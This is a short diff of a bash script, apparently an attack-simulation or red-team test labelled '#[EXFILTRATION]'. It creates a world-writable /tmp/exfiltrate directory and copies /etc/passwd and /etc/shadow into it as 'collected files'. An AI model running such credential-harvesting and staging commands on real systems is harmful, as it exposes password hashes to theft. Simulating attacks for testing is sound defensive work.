@@ -1,6 +1,6 @@
 #!/bin/bash
 # #[EXFILTRATION]
-
+mkdir -m 777 /tmp/exfiltrate
 #Simulate collected files
 cat /etc/passwd > /tmp/exfiltrate/passwd
 cat /etc/shadow > /tmp/exfiltrate/shadow
